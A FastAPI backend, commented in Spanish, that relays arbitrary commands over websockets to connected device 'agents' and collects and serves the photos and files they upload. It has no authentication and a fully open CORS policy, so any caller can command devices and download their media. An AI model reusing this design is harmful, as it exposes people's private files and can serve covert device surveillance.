
import json
import base64
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Response, UploadFile, File
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict, Any
from urllib.parse import unquote

app = FastAPI(title="Agente Control Backend (Subida Bajo Demanda - FINAL)")
app.add_middleware(
    CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
)

# --- "BASE DE DATOS" EN MEMORIA ---
connected_agents: Dict[str, Dict[str, Any]] = {}
device_media_cache: Dict[str, Dict[str, Dict[str, str]]] = {}

# --- MODELOS DE DATOS ---
class Command(BaseModel):
    target_id: str
    action: str
    payload: str = ""

class Thumbnail(BaseModel):
    filename: str
    small_thumb_b64: str

class ThumbnailChunk(BaseModel):
    thumbnails: List[Thumbnail]
    is_final_chunk: bool

# --- ENDPOINTS ---

@app.websocket("/ws/{device_id}/{device_name:path}")
async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
    device_name_decoded = unquote(device_name)
    await websocket.accept()
    print(f"[CONEXIÓN] Agente conectado: '{device_name_decoded}' (ID: {device_id})")
    connected_agents[device_id] = {"ws": websocket, "name": device_name_decoded}
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        name_to_print = connected_agents.get(device_id, {}).get("name", f"ID: {device_id}")
        print(f"[DESCONEXIÓN] Agente desconectado: '{name_to_print}'")
        if device_id in connected_agents: del connected_agents[device_id]
        if device_id in device_media_cache: del device_media_cache[device_id]

# --- ¡RUTA ESENCIAL RESTAURADA! ---
@app.get("/api/get-agents")
async def get_agents():
    return [{"id": device_id, "name": data["name"]} for device_id, data in connected_agents.items()]

@app.post("/api/send-command")
async def send_command_to_agent(command: Command):
    agent = connected_agents.get(command.target_id)
    if not agent:
        return {"status": "error", "message": "Agente no conectado"}
    if command.action == "get_thumbnails":
        print(f"Limpiando caché antigua para {command.target_id[:8]}.")
        device_media_cache[command.target_id] = {}
    try:
        await agent["ws"].send_text(command.json())
        return {"status": "success", "message": "Comando enviado"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.post("/api/submit_media_chunk/{device_id}")
async def submit_media_chunk(device_id: str, chunk: ThumbnailChunk):
    if device_id not in device_media_cache:
        device_media_cache[device_id] = {}
    for thumb in chunk.thumbnails:
        device_media_cache[device_id][thumb.filename] = {"small_thumb_b64": thumb.small_thumb_b64}
    print(f"Recibidas {len(chunk.thumbnails)} miniaturas de {device_id[:8]}.")
    return {"status": "chunk received"}

@app.post("/api/upload_original_file/{device_id}/{filename:path}")
async def upload_original_file(device_id: str, filename: str, file: UploadFile = File(...)):
    if device_id not in device_media_cache or filename not in device_media_cache[device_id]:
        return Response(content="Archivo no solicitado", status_code=400)
    file_bytes = await file.read()
    original_b64 = base64.b64encode(file_bytes).decode('utf-8')
    device_media_cache[device_id][filename]['original_b64'] = original_b64
    print(f"Recibido archivo original '{filename}' de {device_id[:8]}.")
    return {"status": "success"}

@app.get("/api/get_media_list/{device_id}")
async def get_media_list(device_id: str):
    return device_media_cache.get(device_id, {})

@app.get("/media/{device_id}/{filename:path}")
async def get_large_media(device_id: str, filename: str):
    cache = device_media_cache.get(device_id, {})
    media_item = cache.get(filename)
    if not media_item or 'original_b64' not in media_item:
        return Response(content='{"detail":"Archivo original no disponible"}', status_code=404)
    try:
        image_bytes = base64.b64decode(media_item['original_b64'])
        return Response(content=image_bytes, media_type="image/jpeg")
    except Exception as e:
        return Response(content=f'{{"detail":"Error: {e}"}}', status_code=500)
